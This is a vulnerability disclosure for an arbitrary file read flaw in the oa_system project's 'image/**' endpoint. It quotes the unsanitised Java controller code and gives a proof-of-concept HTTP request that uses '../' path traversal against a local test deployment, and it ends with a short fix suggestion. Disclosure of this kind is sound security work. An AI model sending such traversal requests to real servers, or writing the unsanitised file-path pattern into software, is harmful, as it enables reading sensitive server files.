# Vulnerability Description

The open source OA office automation system [aaluoxiang/oa_system](https://gitee.com/aaluoxiang/oa_system) has an API with an arbitrary file read vulnerability (route is "image/**"), which allows attackers to read files in any path on the server, resulting in sensitive information leakage.

- Vulnerability Discloser: [Honor Cyber Security Lab](https://github.com/honorseclab)

- Vendors: [aaluoxiang/oa_system](https://gitee.com/aaluoxiang/oa_system)

- Source code address：[aaluoxiang/oa_system](https://gitee.com/aaluoxiang/oa_system)

Note: 

- **This vulnerability was discovered automatically by my AI code audit tool**.

- Since the author has not released a release package, the version number cannot be determined. The author's latest commit is 2024-08-15. I downloaded the latest code of this project on 20250528 and found the vulnerability.

# Vulnerability Analysis

The vulnerability code entry point is located at：

- [(https://gitee.com/aaluoxiang/oa_system/blob/master/src/main/java/cn/gson/oasys/controller/user/UserpanelController.java#L235](https://gitee.com/aaluoxiang/oa_system/blob/master/src/main/java/cn/gson/oasys/controller/user/UserpanelController.java#L235)

The complete relevant code information of the vulnerability exploit chain is as follows:

```java
// src\main\java\cn\gson\oasys\controller\user\UserpanelController.java:image
    @RequestMapping("image/**")
	public void image(Model model, HttpServletResponse response, @SessionAttribute("userId") Long userId, HttpServletRequest request)
			throws Exception {
		String projectPath = ClassUtils.getDefaultClassLoader().getResource("").getPath();
		System.out.println(projectPath);
		String startpath = new String(URLDecoder.decode(request.getRequestURI(), "utf-8"));
		String path = startpath.replace("/image", "");   // <-------
		File f = new File(rootpath, path);  // <-------
		ServletOutputStream sos = response.getOutputStream();
		FileInputStream input = new FileInputStream(f.getPath());
		byte[] data = new byte[(int) f.length()];
		IOUtils.readFully(input, data);
		// 将文件流输出到浏览器
		IOUtils.write(data, sos);
		input.close();
		sos.close();
	}
```
As you can see, this interface uses the value of the URI (request.getRequestURI()) that is fully controllable by the outside world as part of the path of the server file to be read. Since no security verification is done, attackers can construct malicious file paths through "../" to read sensitive files on the server across directories.

# Vulnerability Verification

Please deploy the project code and test environment locally according to the instructions in the Readme.md file provided by the author. Then visit the login page through http://ip:8088, log in with the default account and password, and obtain a valid "JSESSIONID" request header.

The vulnerability proof of concept (POC) is as follows:

```js
GET /image/image/../../image/passwd.txt HTTP/1.1
Host: 192.168.17.108:8088
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://192.168.17.108:8088/index
Cookie: JSESSIONID=39BCE66CED9A96370B62B1DAF08FB164
Upgrade-Insecure-Requests: 1
Priority: u=4
```

Below are two screenshots of the verification of this path traversal vulnerability after I deployed the environment on my own Windows machine：
![图片](https://github.com/user-attachments/assets/c93f3567-5066-44a7-bc16-8df2c3f0c653)
![图片](https://github.com/user-attachments/assets/d7235549-ed96-4f4f-aee0-b48d548722e0)

# Security Suggestions

Check the legitimacy of the URI passed by the front end and limit illegal characters such as "../".
